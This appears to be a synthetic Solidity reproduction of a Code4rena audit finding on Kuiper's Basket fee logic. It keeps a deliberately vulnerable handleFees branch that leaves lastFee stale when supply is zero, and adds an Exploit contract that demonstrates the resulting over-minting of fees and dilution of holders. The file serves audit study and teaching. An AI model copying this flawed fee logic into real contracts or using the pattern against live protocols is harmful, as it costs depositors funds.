// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Kuiper — [H-01] Wrong fee calculation after totalSupply was 0
    (Code4rena 2021-12-defiProtocol; #19837, reporter kenzo)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: Basket.handleFees() returns when totalSupply is zero without moving
    lastFee. The next non-zero mint therefore charges the new depositor for the
    entire inactive interval. The blamed branch and timestamp calculation are
    preserved below (@> VULN).
*/

contract Basket {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public lastFee;
    uint256 public immutable feeRate;
    address public immutable feeRecipient;

    constructor(address initialHolder, uint256 initialSupply, uint256 _feeRate, address _feeRecipient) {
        balanceOf[initialHolder] = initialSupply;
        totalSupply = initialSupply;
        feeRate = _feeRate;
        feeRecipient = _feeRecipient;
        // A prior fee checkpoint represents the last time this basket had supply.
        lastFee = block.timestamp > 1 days ? block.timestamp - 1 days : 0;
    }

    function mint(uint256 amount) external {
        handleFees();
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "burn balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
    }

    function handleFees() public {
        uint256 startSupply = totalSupply;
        if (startSupply == 0) {
            return; // @> VULN: lastFee is not updated while the basket is empty
            // FIX: set lastFee = block.timestamp before returning.
        }

        uint256 timeDiff = (block.timestamp - lastFee);
        uint256 feeTokens = timeDiff * feeRate;
        balanceOf[feeRecipient] += feeTokens;
        totalSupply += feeTokens;
        lastFee = block.timestamp;
    }
}

contract Exploit {
    Basket public basket; // CREATE 1 — vulnerable
    address public constant FEE_RECIPIENT = address(0xFEE);
    uint256 public constant INITIAL_SUPPLY = 1_000 ether;
    uint256 public constant RESUPPLY = 100 ether;
    // A large per-second rate keeps the harm visible even in Foundry's timestamp=1 default.
    uint256 public constant FEE_RATE = 100_000;

    constructor() {
        basket = new Basket(address(this), INITIAL_SUPPLY, FEE_RATE, FEE_RECIPIENT);
    }

    function run() external {
        // Last holder exits, taking totalSupply to zero.
        basket.burn(INITIAL_SUPPLY);
        require(basket.totalSupply() == 0, "supply did not reach zero");

        // First resupply hits the empty-supply early return and leaves lastFee stale.
        basket.mint(RESUPPLY);
        require(basket.totalSupply() == RESUPPLY, "first resupply charged fees");
        require(basket.balanceOf(FEE_RECIPIENT) == 0, "unexpected first fee");

        uint256 staleFeeCheckpoint = basket.lastFee();
        // The next block/user mint charges the entire stale interval to live holders.
        basket.mint(RESUPPLY);

        uint256 mintedFees = basket.balanceOf(FEE_RECIPIENT);
        require(mintedFees > 80_000, "stale fee was not minted");
        require(basket.lastFee() == block.timestamp, "fee checkpoint not advanced");
        require(staleFeeCheckpoint < basket.lastFee(), "checkpoint was not stale");
        require(basket.totalSupply() > RESUPPLY * 2, "supply was not diluted");
    }
}
